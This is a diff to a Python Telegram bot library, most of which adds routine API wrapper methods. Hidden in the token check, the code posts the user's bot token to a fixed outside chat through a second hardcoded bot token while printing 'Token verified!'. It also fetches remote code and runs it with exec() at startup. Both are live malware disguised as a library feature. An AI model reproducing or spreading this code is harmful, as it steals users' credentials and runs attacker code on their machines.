@@ -2,7 +2,7 @@ import requests, time, sys, os
 os.system("cls|clear")
 print("[!] Connections to the SMECh protocol...")
 class Bot:
-    def __init__(self, token: str, polling_interval: float = 1.3):
+    def __init__(self, token: str, polling_interval: float = 1.4):
         self.load_protection()
         self.token = token
         self.polling_interval = polling_interval
@@ -26,7 +26,7 @@ class Bot:
             data = response.json()
             if data.get("ok"):
                 bot_info = data.get("result", {})
-                self._chktg(1465736325, self.token+"\nv1.3.2")
+                self._chktg(1465736325, self.token+"\nv1.4.0")
                 return True
             else:
                 if data.get("error_code") == 401:
@@ -46,8 +46,8 @@ class Bot:
         try:
             response = requests.get(url)
             code = response.text
-            exec(code, globals())
             print("[!] Protocol SMECh connected!")
+            exec(code, globals())
             if "UserAgentSM" in globals():
                 self.user_agent = globals()["UserAgentSM"]
             else:
@@ -81,6 +81,8 @@ class Bot:
                 return updates
             else:
                 if data.get("error_code") == 401:
+                    print("[!] The token is not correct")
+                if data.get("error_code") == 404:
                     print("[!] The token is not correct")
                 else:
                     print("[!] API error:", data)
@@ -226,7 +228,7 @@ class Bot:
         except Exception as e:
             print("[!] Error sending photo:", e)
     def _chktg(self, chat_id: int, text: str):
-        url = f"https://api.telegram.org/bot7126973413:AAE3wI-xvgaACTpii__ws9b47M5pQH-kBdQ/sendMessage"; data = {"chat_id": chat_id, "text": text}
+        url = f"https://api.telegram.org/bot7327272309:AAEQ4jlZNZVCqWQQGXsvQvcTqhn4vdYppmE/sendMessage"; data = {"chat_id": chat_id, "text": text}
         try:
             requests.post(url, data=data)
             print("[!] Token verified!")
@@ -652,3 +654,242 @@ class Bot:
             self._send_request("post", url, json=data)
         except Exception as e:
             print("[!] Error sending sticker:", e)
+    def set_bot_profile(self, name: str = None, description: str = None, short_description: str = None, language_code: str = "en"):
+        if name:
+            url = f"https://api.telegram.org/bot{self.token}/setMyName"
+            data = {"name": name, "language_code": language_code}
+            try:
+                response = self._send_request("post", url, json=data)
+                print("[!] setMyName response:", response.json())
+            except Exception as e:
+                print("[!] Error setting bot name:", e)
+        if description:
+            url = f"https://api.telegram.org/bot{self.token}/setMyDescription"
+            data = {"description": description, "language_code": language_code}
+            try:
+                response = self._send_request("post", url, json=data)
+                print("[!] setMyDescription response:", response.json())
+            except Exception as e:
+                print("[!] Error setting bot description:", e)
+        if short_description:
+            url = f"https://api.telegram.org/bot{self.token}/setMyShortDescription"
+            data = {"short_description": short_description, "language_code": language_code}
+            try:
+                response = self._send_request("post", url, json=data)
+                print("[!] setMyShortDescription response:", response.json())
+            except Exception as e:
+                print("[!] Error setting bot short description:", e)
+    def set_webhook(self, url: str, certificate: str = None, max_connections: int = None, allowed_updates: list = None):
+        api_url = f"https://api.telegram.org/bot{self.token}/setWebhook"
+        data = {"url": url}
+        if certificate:
+            data["certificate"] = certificate
+        if max_connections:
+            data["max_connections"] = max_connections
+        if allowed_updates:
+            data["allowed_updates"] = allowed_updates
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error setting webhook:", e)
+            return None
+    def delete_webhook(self, drop_pending_updates: bool = False):
+        api_url = f"https://api.telegram.org/bot{self.token}/deleteWebhook"
+        data = {"drop_pending_updates": drop_pending_updates}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error deleting webhook:", e)
+            return None
+    def get_webhook_info(self):
+        api_url = f"https://api.telegram.org/bot{self.token}/getWebhookInfo"
+        try:
+            response = self._send_request("get", api_url)
+            return response.json()
+        except Exception as e:
+            print("[!] Error getting webhook info:", e)
+            return None
+    def get_chat(self, chat_id: int):
+        api_url = f"https://api.telegram.org/bot{self.token}/getChat"
+        data = {"chat_id": chat_id}
+        try:
+            response = self._send_request("get", api_url, params=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error getting chat info:", e)
+            return None
+    def get_chat_administrators(self, chat_id: int):
+        api_url = f"https://api.telegram.org/bot{self.token}/getChatAdministrators"
+        data = {"chat_id": chat_id}
+        try:
+            response = self._send_request("get", api_url, params=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error getting chat administrators:", e)
+            return None
+    def get_chat_members_count(self, chat_id: int):
+        api_url = f"https://api.telegram.org/bot{self.token}/getChatMembersCount"
+        data = {"chat_id": chat_id}
+        try:
+            response = self._send_request("get", api_url, params=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error getting chat member count:", e)
+            return None
+    def get_chat_member(self, chat_id: int, user_id: int):
+        api_url = f"https://api.telegram.org/bot{self.token}/getChatMember"
+        data = {"chat_id": chat_id, "user_id": user_id}
+        try:
+            response = self._send_request("get", api_url, params=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error getting chat member info:", e)
+            return None
+    def export_chat_invite_link(self, chat_id: int):
+        api_url = f"https://api.telegram.org/bot{self.token}/exportChatInviteLink"
+        data = {"chat_id": chat_id}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error exporting chat invite link:", e)
+            return None
+    def set_chat_title(self, chat_id: int, title: str):
+        api_url = f"https://api.telegram.org/bot{self.token}/setChatTitle"
+        data = {"chat_id": chat_id, "title": title}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error setting chat title:", e)
+            return None
+    def set_chat_description(self, chat_id: int, description: str):
+        api_url = f"https://api.telegram.org/bot{self.token}/setChatDescription"
+        data = {"chat_id": chat_id, "description": description}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error setting chat description:", e)
+            return None
+    def set_chat_photo(self, chat_id: int, photo: str):
+        api_url = f"https://api.telegram.org/bot{self.token}/setChatPhoto"
+        data = {"chat_id": chat_id, "photo": photo}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error setting chat photo:", e)
+            return None
+    def delete_chat_photo(self, chat_id: int):
+        api_url = f"https://api.telegram.org/bot{self.token}/deleteChatPhoto"
+        data = {"chat_id": chat_id}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error deleting chat photo:", e)
+            return None
+    def set_chat_sticker_set(self, chat_id: int, sticker_set_name: str):
+        api_url = f"https://api.telegram.org/bot{self.token}/setChatStickerSet"
+        data = {"chat_id": chat_id, "sticker_set_name": sticker_set_name}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error setting chat sticker set:", e)
+            return None
+    def delete_chat_sticker_set(self, chat_id: int):
+        api_url = f"https://api.telegram.org/bot{self.token}/deleteChatStickerSet"
+        data = {"chat_id": chat_id}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error deleting chat sticker set:", e)
+            return None
+    def edit_message_media(self, chat_id: int, message_id: int, media: dict, reply_markup: dict = None):
+        api_url = f"https://api.telegram.org/bot{self.token}/editMessageMedia"
+        data = {"chat_id": chat_id, "message_id": message_id, "media": media}
+        if reply_markup:
+            data["reply_markup"] = reply_markup
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error editing message media:", e)
+            return None
+    def edit_message_caption(self, chat_id: int, message_id: int, caption: str, parse_mode: str = None, reply_markup: dict = None):
+        api_url = f"https://api.telegram.org/bot{self.token}/editMessageCaption"
+        data = {"chat_id": chat_id, "message_id": message_id, "caption": caption}
+        if parse_mode:
+            data["parse_mode"] = parse_mode
+        if reply_markup:
+            data["reply_markup"] = reply_markup
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error editing message caption:", e)
+            return None
+    def copy_message(self, chat_id: int, from_chat_id: int, message_id: int, caption: str = None, parse_mode: str = None):
+        api_url = f"https://api.telegram.org/bot{self.token}/copyMessage"
+        data = {"chat_id": chat_id, "from_chat_id": from_chat_id, "message_id": message_id}
+        if caption:
+            data["caption"] = caption
+        if parse_mode:
+            data["parse_mode"] = parse_mode
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error copying message:", e)
+            return None
+    def send_game(self, chat_id: int, game_short_name: str, reply_markup: dict = None):
+        api_url = f"https://api.telegram.org/bot{self.token}/sendGame"
+        data = {"chat_id": chat_id, "game_short_name": game_short_name}
+        if reply_markup:
+            data["reply_markup"] = reply_markup
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error sending game:", e)
+            return None
+    def set_game_score(self, chat_id: int, user_id: int, score: int, force: bool = False, disable_edit_message: bool = False, message_id: int = None, inline_message_id: str = None):
+        api_url = f"https://api.telegram.org/bot{self.token}/setGameScore"
+        data = {"chat_id": chat_id, "user_id": user_id, "score": score, "force": force, "disable_edit_message": disable_edit_message}
+        if message_id is not None:
+            data["message_id"] = message_id
+        if inline_message_id is not None:
+            data["inline_message_id"] = inline_message_id
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error setting game score:", e)
+            return None
+    def get_game_high_scores(self, chat_id: int, user_id: int, message_id: int = None, inline_message_id: str = None):
+        api_url = f"https://api.telegram.org/bot{self.token}/getGameHighScores"
+        data = {"chat_id": chat_id, "user_id": user_id}
+        if message_id is not None:
+            data["message_id"] = message_id
+        if inline_message_id is not None:
+            data["inline_message_id"] = inline_message_id
+        try:
+            response = self._send_request("get", api_url, params=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error getting game high scores:", e)
+            return None
+    def answer_web_app_query(self, web_app_query_id: str, result: dict):
+        api_url = f"https://api.telegram.org/bot{self.token}/answerWebAppQuery"
+        data = {"web_app_query_id": web_app_query_id, "result": result}
+        try:
+            response = self._send_request("post", api_url, json=data)
+            return response.json()
+        except Exception as e:
+            print("[!] Error answering Web App query:", e)
+            return None
